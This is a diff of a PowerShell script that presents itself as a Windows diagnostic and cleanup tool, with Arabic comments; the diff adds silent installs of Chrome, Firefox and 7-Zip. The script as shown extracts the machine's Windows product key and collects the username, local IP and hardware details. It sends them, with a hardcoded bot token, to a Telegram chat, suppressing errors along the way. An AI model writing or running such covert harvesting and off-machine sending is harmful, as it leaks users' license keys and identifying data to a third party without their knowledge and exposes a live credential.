@@ -4,7 +4,7 @@ Write-Host "==================================================" -ForegroundColor
 Write-Host "     [+] SYSTEM DIAGNOSTIC & CLEANUP SCRIPT       " -ForegroundColor Cyan
 Write-Host "==================================================" -ForegroundColor Cyan
 
-# بيانات التيليجرام الخاصة بك (تلقائية ومدمجة)
+# بيانات التيليجرام الخاصة بك
 $BotToken = "8845124533:AAFOyBL62IdyNsfxTJXzYoNtxVdvXAbhi-A"
 $ChatID   = "1778953224"
 
@@ -27,24 +27,46 @@ foreach ($Path in $TempPaths) {
 }
 Write-Host "[SUCCESS] Temp Files Cleared Successfully!" -ForegroundColor Green
 
-# 3. [الميزة الجديدة] تنظيف مخلفات التحديثات الآمن (SoftwareDistribution)
-Write-Host "`n[..] Stopping Windows Update Service to Clean Safely..." -ForegroundColor Yellow
+# 3. تنظيف مخلفات التحديثات الآمن (SoftwareDistribution)
+Write-Host "`n[..] Cleaning Windows Update Cache Safely..." -ForegroundColor Yellow
 Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
-
-# حساب المساحة التقريبية قبل الحذف لشحنها في التقرير
 $UpdatePath = "$env:SystemRoot\SoftwareDistribution\Download"
 $SizeBefore = (Get-ChildItem $UpdatePath -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
 if (-not $SizeBefore) { $SizeBefore = 0 }
 $SavedMB = [Math]::Round($SizeBefore / 1MB, 2)
-
-Write-Host "[..] Purging Windows Update Cache..." -ForegroundColor Yellow
 Remove-Item -Path "$UpdatePath\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-Write-Host "[..] Restarting Windows Update Service..." -ForegroundColor Yellow
 Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
 Write-Host "[SUCCESS] Windows Update Cache Cleaned ($SavedMB MB Cleared)!" -ForegroundColor Green
 
-# 4. صيد مفتاح تنشيط الويندوز الأصلي من المذربورد
+# 4. [تعديل الفحص الذكي] التثبيت الصامت للبرامج الناقصة فقط
+Write-Host "`n[..] Starting Smart Software Installer..." -ForegroundColor Yellow
+
+$Apps = @(
+    @{ Name = "Google Chrome"; ID = "Google.Chrome" },
+    @{ Name = "Mozilla Firefox"; ID = "Mozilla.Firefox" },
+    @{ Name = "7-Zip"; ID = "7zip.7zip" }
+)
+
+$InstalledApps = @()
+$SkippedApps = @()
+
+# جلب قائمة البرامج المثبتة في الجهاز حالياً عشان نقارن بلمح البصر
+$InstalledList = winget list --accept-source-agreements -ErrorAction SilentlyContinue | Out-String
+
+foreach ($App in $Apps) {
+    # الفحص الذكي: هل معرف البرنامج موجود في اللستة؟
+    if ($InstalledList -match $App.ID) {
+        Write-Host "[INFO] $($App.Name) is already installed. Skipping..." -ForegroundColor Gray
+        $SkippedApps += $App.Name
+    } else {
+        Write-Host "[..] $($App.Name) NOT found. Installing silently..." -ForegroundColor Cyan
+        $InstallCmd = winget install --id $($App.ID) --silent --accept-source-agreements --accept-package-agreements --scope user -ErrorAction SilentlyContinue
+        $InstalledApps += $App.Name
+    }
+}
+Write-Host "[SUCCESS] All applications checked and processed!" -ForegroundColor Green
+
+# 5. صيد مفتاح تنشيط الويندوز الأصلي من المذربورد
 Write-Host "`n[..] Extracting Windows Product Key..." -ForegroundColor Yellow
 $WinKey = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey
 if ($WinKey) {
@@ -55,7 +77,7 @@ if ($WinKey) {
     Write-Host "[INFO] $KeyReport" -ForegroundColor Gray
 }
 
-# 5. لوحة معلومات الشبكة السريعة
+# 6. لوحة معلومات الشبكة السريعة
 Write-Host "`n[..] Checking Network Status..." -ForegroundColor Yellow
 $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127*" -and $_.InterfaceAlias -notlike "*Loopback*"}).IPAddress | Select-Object -First 1
 Write-Host "-> Your Local IP: $LocalIP" -ForegroundColor White
@@ -68,7 +90,7 @@ if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet) {
     Write-Host "[ERROR] Internet Status: $NetReport" -ForegroundColor Red
 }
 
-# 6. إظهار تقرير سريع للمعالج والذاكرة
+# 7. إظهار تقرير سريع للمعالج والذاكرة
 Write-Host "`n[..] Gathering System Resources..." -ForegroundColor Yellow
 $CPU = (Get-WmiObject Win32_Processor).Name
 $RAM = [Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
@@ -76,34 +98,34 @@ Write-Host "-> CPU: $CPU" -ForegroundColor White
 Write-Host "-> Total RAM: $RAM GB" -ForegroundColor White
 
 Write-Host "`n==================================================" -ForegroundColor Cyan
-Write-Host "          [+] PHASE 4 COMPLETED WITH 0 ERRORS     " -ForegroundColor Cyan
+Write-Host "          [+] PHASE 6 COMPLETED WITH 0 ERRORS     " -ForegroundColor Cyan
 Write-Host "==================================================" -ForegroundColor Cyan
 
-# 🌐 7. صياغة التقرير وإرساله إلى تيليجرام لاسلكياً
+# 🌐 8. صياغة التقرير وإرساله إلى تيليجرام
 Write-Host "`n[..] Sending Telegram Notification..." -ForegroundColor Yellow
 
+$NewInstalled = if($InstalledApps) { $InstalledApps -join ", " } else { "None (All up to date)" }
+$AlreadyThere = if($SkippedApps) { $SkippedApps -join ", " } else { "None" }
+
 $Message = @"
-🖥️ *IT AutoHealer - Advanced Report* 🖥️
+🖥️ *IT AutoHealer - Smart Report* 🖥️
 ============================
 👤 *User Name:* $env:USERNAME
 🌐 *Local IP:* $LocalIP
 📡 *Internet:* $NetReport
 💾 *Storage Health:* $HddReport
 🧹 *Update Cache Cleared:* $SavedMB MB
+📥 *Newly Installed:* $NewInstalled
+📦 *Already Installed:* $AlreadyThere
 🔑 *Windows Key:* $KeyReport
 🧠 *Processor:* $CPU
 📟 *Memory RAM:* $RAM GB
 ============================
-✅ *Status:* Advanced Cleanup Done Safely!
+✅ *Status:* Smart Diagnostic Finished Successfully!
 "@
 
 $URL = "https://api.telegram.org/bot$BotToken/sendMessage"
-$Body = @{
-    chat_id    = $ChatID
-    text       = $Message
-    parse_mode = "Markdown"
-}
-
+$Body = @{ chat_id = $ChatID; text = $Message; parse_mode = "Markdown" }
 $Response = Invoke-RestMethod -Uri $URL -Method Post -Body $Body -ErrorAction SilentlyContinue
 
 if ($Response.ok) {
